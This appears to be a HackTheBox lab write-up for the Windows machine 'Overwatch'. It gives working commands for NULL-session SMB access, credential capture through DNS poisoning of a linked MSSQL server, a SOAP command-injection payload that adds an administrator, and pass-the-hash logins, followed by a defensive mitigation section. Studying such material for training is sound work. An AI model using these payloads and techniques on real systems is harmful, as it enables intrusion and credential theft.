---
title: Overwatch
os: Windows
difficulty: Medium
tags:
  - Active Directory
  - MSSQL
  - DNS Poisoning
  - Linked SQL Server
  - SOAP Web Service
  - Command Injection
  - Privilege Escalation
date: 2026-01-26
---

# 🛡️ HTB - Overwatch (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Overwatch
- **Operating System:** Windows Server 2022
- **Difficulty:** Hard
- **Date of Scan:** 2026-01-26
- **Vulnerabilities:** NULL SMB Session Information Leak, Linked MSSQL Server NTLM Relaying / DNS Poisoning, Unsanitized SOAP Web Service Command Injection

---

## Step 1 - Reconnaissance

Will Use Namp To Se what Port And Services are Open

```bash
nmap -A -sS -Pn -T4  --min-rate 5000 10.129.12.253
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-26 13:38 UTC
Nmap scan report for 10.129.12.253
Host is up (0.27s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  tcpwrapped
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-26 13:37:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-26T13:38:43+00:00; -47s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-26T13:38:03+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-26T13:38:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -47s, deviation: 0s, median: -47s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   264.70 ms 10.10.14.1
2   266.87 ms 10.129.12.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done
```

- 🔍 *An Active Directory Environment.*

---

## Step 2 - Enumeration

- 🔍 *First Lets look at the SMB service, if it has NULL Session Allowed or not*

```bash
smbclient -L 10.129.12.253 -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        software$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.12.253 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- 🔍 *Interesting, the NULL session is allowed, so we can access the custom share.*
- 🔍 *Lets look what this 'software$' custom share got for us*

```bash
smbclient \\\\10.129.12.253\\software$ -N
```

```text
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 01:32:43 2025
  ..                                 DH        0  Sat May 17 01:27:07 2025
  EntityFramework.dll                AH  4991352  Thu Apr 16 20:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 20:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 20:38:56 2020
  EntityFramework.xml                AH  3738289  Thu Apr 16 20:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 14:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 01:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 01:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 01:19:24 2025
  System.Data.SQLite.dll             AH   450232  Sun Sep 29 20:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 20:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 20:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 18:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 14:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 14:46:10 2017
  x64                                DH        0  Sat May 17 01:32:33 2025
  x86                                DH        0  Sat May 17 01:32:33 2025
```

- 🔍 *we are in, and i can se some service files, marked as some monitor service.*
- 🔍 *Well i enumerated all the files but got nothing interesting, except one thing, a internal HTTP service running at port 8000 "http://overwatch.htb:8000/MonitoringService", so can't access it*
- 🔍 *Lets try to Decompile the overwatch.exe file, lets see if we can get something*

```bash
ilspycmd -p -o decompiled overwatch.exe
ls -la decompiled
```

```text
total 36
drwxr-xr-x 3 root root 4096 Jan 27 07:22 .
drwxr-xr-x 5 root root 4096 Jan 27 07:32 ..
-rw-r--r-- 1 root root 2163 Jan 26 13:53 app.config
-rw-r--r-- 1 root root   36 Jan 27 07:22 Creds
-rw-r--r-- 1 root root  245 Jan 27 07:14 IMonitoringService.cs
-rw-r--r-- 1 root root 3911 Jan 27 07:14 MonitoringService.cs
-rw-r--r-- 1 root root  995 Jan 27 07:14 overwatch.csproj
-rw-r--r-- 1 root root 2586 Jan 27 07:14 Program.cs
drwxr-xr-x 2 root root 4096 Jan 27 07:14 Properties
```

- 🔍 *Lets take a look at Program.cs*

```csharp
using System;
using System.Data.Common;
using System.Data.SQLite;
using System.Data.SqlClient;
using System.IO;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Timers;

internal class Program
{
	private static void Main(string[] args)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		ServiceHost val = new ServiceHost(typeof(MonitoringService), Array.Empty<Uri>());
		((CommunicationObject)val).Open();
		Console.WriteLine("Service is running...");
		Timer timer = new Timer(30000.0);
		timer.Elapsed += CheckEdgeHistory;
		timer.Start();
		Console.WriteLine("Press Enter to exit...");
		Console.ReadLine();
		((CommunicationObject)val).Close();
	}

	private static void CheckEdgeHistory(object sender, ElapsedEventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\History");
		if (!File.Exists(text))
		{
			return;
		}
		string tempFileName = Path.GetTempFileName();
		File.Copy(text, tempFileName, overwrite: true);
		try
		{
			SqlConnection val = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");
			try
			{
				((DbConnection)(object)val).Open();
				SqlCommand val2 = new SqlCommand();
				try
				{
					val2.Connection = val;
					SQLiteConnection sQLiteConnection = new SQLiteConnection("Data Source=" + tempFileName + ";Version=3;");
					sQLiteConnection.Open();
					SQLiteDataReader sQLiteDataReader = new SQLiteCommand("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5", sQLiteConnection).ExecuteReader();
					while (sQLiteDataReader.Read())
					{
						string text2 = sQLiteDataReader["url"].ToString();
						string commandText = "INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), 'URLVisit', '" + text2 + "')";
						((DbCommand)(object)val2).CommandText = commandText;
						((DbCommand)(object)val2).ExecuteNonQuery();
					}
					sQLiteConnection.Close();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		finally
		{
			File.Delete(tempFileName);
		}
	}
}
```

- 🔍 *As Expected, found Creds for user SQLSVC*
  - **Username:** sqlsvc
  - **Password:** TI0LKcfHzZw1Vv

- 🔍 *Lets Try to look for the ms-sql service, so we can get the sql shell*

```bash
nmap -p 1433 10.129.13.149
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 14:33 UTC
Nmap scan report for 10.129.13.149
Host is up (0.24s latency).

PORT     STATE    SERVICE
1433/tcp filtered ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
```

- 🔍 *well the usual port is in filtered state, then there must be a custom port*
- 🔍 *While Enumerating i have found a port*

```bash
nmap -sV -p 6520 10.129.13.225
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 14:06 UTC
Nmap scan report for overwatch.htb (10.129.13.225)
Host is up (0.27s latency).

PORT     STATE SERVICE  VERSION
6520/tcp open  ms-sql-s Microsoft SQL Server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6520-TCP:V=7.94SVN%I=7%D=1/27%Time=6978C6BA%P=x86_64-pc-linux-gnu%r
SF:(ms-sql-s,25,"\x04\x01\0%\0\0\x01\0\0\0\x15\0\x06\x01\0\x1b\0\x01\x02\0
SF:\x1c\0\x01\x03\0\x1d\0\0\xff\x10\0\x03\xe8\0\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.77 seconds
```

- 🔍 *The ms-sql Service is running at port 6520.*

> [!NOTE]
> Connecting via MSSQL Client.

```bash
impacket-secretsdump 'overwatch.htb/pwn:Password123!@10.129.14.2'
```

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.13.149' -port 6520 -windows-auth
```

```text
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.

SQL (OVERWATCH\sqlsvc  guest@master)> 
```

- 🔍 *Well, while Enumerating, i couldn't find anything interesting, it is not a sysadmin, and can't enable xp_cmdshell, as well as no user to impersonate with*
- 🔍 *However we can do DNS Poisoning*

> [!NOTE]
> **DNS Poisoning Attack to Capture Credentials**
> 
> **Context:**
> From the decompiled `MonitoringService.cs`, we saw a linked server `SQL07` in the MSSQL instance.
> When a linked server is accessed (e.g., `EXEC ('SELECT 1') AT [SQL07]`), SQL Server attempts to authenticate to that remote server using Windows authentication (NTLM).
> 
> If `SQL07` doesn’t exist or DNS is poisoned to point to our IP, the authentication attempt goes to us, and we can capture the NTLM hash (or sometimes cleartext credentials depending on protocol).

- 🔍 *While Listing the Links, we can see there is SQL07, so we can trigger it to capture the creds*
- 🔍 *Before that we need to add a DNS record for this Link which points to our IP*
- 🔍 *And then will trigger it to capture the Creds*

---

## Step 3 - Initial Foothold

- 🔍 *Lets First Add the DNS record*

```bash
python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -d YOUR_IP -t A -a add 10.129.13.225
```

```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- 🔍 *Now Lets Run The Responder*

```bash
responder -I tun0 -w
```

```text
[+] Current Session Variables:
    Responder Machine Name     [WIN-JMY2UQPWD24]
    Responder Domain Name      [4XLB.LOCAL]
    Responder DCE-RPC Port     [45360]

[+] Listening for events...  
```

- 🔍 *Lets Trigger The Link now*

```text
SQL (OVERWATCH\sqlsvc  guest@master)> use_link SQL07

INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

- 🔍 *Got Creds*

```text
[MSSQL] Cleartext Client   : 10.129.13.149
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

- **USER:** sqlmgmt
- **PASS:** bIhBbzMMnB82yx

- 🔍 *Now Lets see if we can access Evil-winrm, well obviously we cam, because while enumerating i have seen that sqlmgmt is in Remote Management Group*

```bash
crackmapexec winrm 10.129.13.149 -u sqlmgmt -p bIhBbzMMnB82yx
```

```text
SMB         10.129.13.149   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
HTTP        10.129.13.149   5985   S200401          [*] http://10.129.13.149:5985/wsman
WINRM       10.129.13.149   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

- 🔍 *Acquire the User Flag*

```bash
evil-winrm -i 10.129.13.149 -u sqlmgmt -p bIhBbzMMnB82yx
```

```text
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                           
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                      
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..
*Evil-WinRM* PS C:\Users\sqlmgmt> cd Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> ls


    Directory: C:\Users\sqlmgmt\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/26/2026   7:46 AM             34 user.txt
```

---

## Step 4 - Privilege Escalation

- 🔍 *While Running WinPEASE, could not found anything useful*
- 🔍 *From decompiled code, MonitoringService.KillProcess method ran:*
  `Stop-Process -Name <processName> -Force`
- 🔍 *No input sanitization → command injection via processName parameter.*
- 🔍 *Service ran as SYSTEM (confirmed via Get-Service).*
- 🔍 *Sent SOAP request to http://localhost:8000/MonitorService with payload:*
  `fake|net user pwn Password123! /add|net localgroup administrators pwn /add`
- 🔍 *Then Once The User is Added, we can dump secrets*

> [!NOTE]
> **Execution Flow:**
> Lets First Craft an XML body to be sent (In the WinRM Shell).

```powershell
$Body = @'
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:KillProcess>
         <tem:processName>fake|net user pwn Password123! /add|net localgroup administrators pwn /add</tem:processName>
      </tem:KillProcess>
   </soapenv:Body>
</soapenv:Envelope>
'@

Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService" -Method POST -ContentType "text/xml" -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} -Body $Body -UseBasicParsing
```

- 🔍 *Then Check If the User is Added or not*

```powershell
net user pwn
```

```text
User name                    pwn
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/27/2026 10:02:09 PM
Password expires             3/10/2026 10:02:09 PM
Password changeable          1/28/2026 10:02:09 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

- 🔍 *Great, User is Added, lets dump the hashes now*

```bash
impacket-secretsdump 'overwatch.htb/pwn:Password123!@10.129.14.2'
```

```text
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2aabc1e8bc70fdfc93ffebecf0f15993
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:269fa056205bbf5d47fc2c3682dbbce6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OVERWATCH\S200401$:aes256-cts-hmac-sha1-96:f4a09677df6d6dafda711e41636c86b4ca081fc22933e1b1537512071212f855
```

- 🔍 *We have Got the Admin ntlm hash*
- 🔍 *Lets Get Evil-WinRM shell, and Root Flag*

```bash
evil-winrm -i 10.129.14.2 -u Administrator -H 269fa056205bbf5d47fc2c3682dbbce6
```

```text
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                       
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/16/2025   5:00 PM           2308 Microsoft Edge.lnk
-ar---         1/27/2026   5:35 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e111f**********************
```

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Overwatch lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Permissive SMB NULL Sessions / Anonymous File Sharing

> [!WARNING]
> **Vulnerability Profile:**
> The domain server's SMB share interface was configured to permit anonymous NULL sessions (`-N`), allowing unauthenticated network actors to query, list, and download compiled executable assemblies (`overwatch.exe`, configuration libraries) from custom software repositories (`software$`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Permitting NULL sessions completely exposes system assets to initial-stage recon. Unauthenticated attackers on the segment can map directory configurations, identify critical service tools, and perform dynamic binary decompilation to harvest hardcoded service passwords, leading directly to targeted database or host infiltration.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Disable anonymous share listings and restrict NULL sessions domain-wide. Configure the local registry values `NullSessionShares` and set `RestrictNullSessAccess` to `1` on all Windows server endpoints.
> - **Remediation:** Apply rigid access permissions to custom software shares. Ensure only authenticated domain accounts with a strict need-to-know have read access to executable paths.
> - **Detection:** Set up immediate alerts for unauthenticated or NULL session access attempts (`NT_STATUS_SUCCESS` without authenticating identity) directed toward domain resource directories.

---

### 🔴 Hardcoded Database Credentials in Compiled Binaries

> [!WARNING]
> **Vulnerability Profile:**
> The compiled .NET application binary (`overwatch.exe`) contains cleartext administrative SQL credentials (`sqlsvc:TI0LKcfHzZw1Vv`) within its connection string buffers.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Executable assemblies (.NET binaries, Java jar files) can be easily reverse-engineered using standard decompilers (like ILSpy or dotPeek) to retrieve original source code. Storing administrative or service credentials in plain text within code constructs guarantees that once an attacker retrieves the binary, they will obtain full, authenticated access to the database engine.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Strictly implement **Windows Integrated Authentication** (Group Managed Service Accounts - gMSA) for application-to-database connections, completely eliminating the need for hardcoded password strings in local configs.
> - **Remediation:** If static SQL logins cannot be avoided, encrypt the credential blocks using Windows **Data Protection API (DPAPI)** boundary mechanisms or load connection credentials dynamically at runtime using secure environment vaults.
> - **Detection:** Integrate automated static application security testing (SAST) tools into building and deployment pipelines to catch hardcoded secrets prior to binary compilation.

---

### 🔴 Insecure Linked Server Configurations & Dynamic DNS Poisoning

> [!WARNING]
> **Vulnerability Profile:**
> The MSSQL instance utilizes a Linked Server named `SQL07` configured to delegate Windows/NTLM authentication context. Loose Active Directory permissions permit low-privilege service accounts (`sqlsvc`) to dynamic-register or poison host DNS A records mapping to external destinations.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> When linked servers with Windows Authentication context are triggered, they initiate outbound network authentication handshakes. If an attacker poisons local DNS records to point the target hostname (like `SQL07`) to their own controlled IP, the database engine will attempt to authenticate to the rogue host, leaking administrative service credentials (`sqlmgmt` plain text or hash payloads) via relayed NTLM packets.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Lock down Linked Server authentication paths. Avoid using default Windows/NTLM security delegation contexts. Explicitly define secure SQL Server logins with the minimum required schema permissions.
> - **Remediation:** Enforce **Secure Dynamic Update** validation rules on Active Directory DNS servers. Strip low-privilege accounts of permissions to register or edit critical infrastructure domain names.
> - **Detection:** Configure alerts for dynamic DNS additions matching structural administrative patterns. Monitor network borders and block outbound SMB (`445/tcp`) or MSSQL (`1433/tcp`) authentication requests initiated by secure database engines directed toward foreign IP targets.

---

### 🔴 Unsanitized Process Command Injection in Privileged SOAP Services

> [!WARNING]
> **Vulnerability Profile:**
> The local administrative SOAP endpoint (`IMonitoringService.KillProcess` listening on port 8000) accepts user-controlled process names and pipes them directly into highly-privileged PowerShell execution wrappers (`Stop-Process -Force`) without parameter parsing or validation.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Passing unvalidated user strings into active command shells results in immediate Command Injection. Because the background daemon operates under the high-privilege `SYSTEM` context, attackers can inject shell sequence characters (`|`, `;`, `&`) inside the SOAP payload to execute arbitrary administrative commands, add domain users, and completely compromise the host system.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Completely avoid using shell command interpreter wrappers. Implement programmatic, strongly typed process handling APIs (e.g., .NET's `System.Diagnostics.Process` model) to pass parameters safely without invoking dynamic power shells.
> - **Remediation:** Implement strict regular expression input validation whitelists. Reject any input parameters containing control operators or non-alphanumeric formats.
> - **Detection:** Configure host security audits (e.g., Sysmon Event ID 1) to identify anomalous child process generation hierarchies (such as monitoring service daemons launching `cmd.exe`, `net.exe`, or administrative PowerShell commands).
